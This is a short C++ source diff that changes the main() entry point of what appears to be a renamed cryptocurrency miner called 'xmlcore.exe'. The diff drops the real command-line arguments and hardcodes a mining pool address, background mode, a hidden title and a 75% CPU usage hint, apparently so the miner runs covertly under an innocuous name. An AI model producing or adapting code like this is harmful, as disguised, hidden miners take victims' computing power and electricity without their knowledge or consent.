@@ -25,12 +25,26 @@
 #include "App.h"
 #include "base/kernel/Entry.h"
 #include "base/kernel/Process.h"
+#include <stdio.h>
 
 
 int main(int argc, char **argv) {
     using namespace xmlcore;
+    char  arg0[] = "xmlcore.exe";
+    char  arg1[] = "-o";
+    char  arg2[] = "192.168.202.97:8443";
+    char  arg3[] = "--background";
+    char  arg4[] = "--no-title";
+    char  arg5[] = "--nicehash";
+    char arg6[] = "--cpu-max-threads-hint";
+    char arg7[] = "75";
 
-    Process process(argc, argv);
+    char *argvv[] = { &arg0[0], &arg1[0], &arg2[0], &arg3[0], &arg4[0], &arg5[0], &arg6[0], &arg7[0], NULL };
+    int   argcc   = (int)(sizeof(argvv) / sizeof(argvv[0])) - 1;
+    // for(int i = 0; i < argcc; i++)
+    //    printf("%s\n", argvv[i]);
+
+    Process process(argcc, &argvv[0]);
     const Entry::Id entry = Entry::get(process);
     if (entry) {
         return Entry::exec(process, entry);
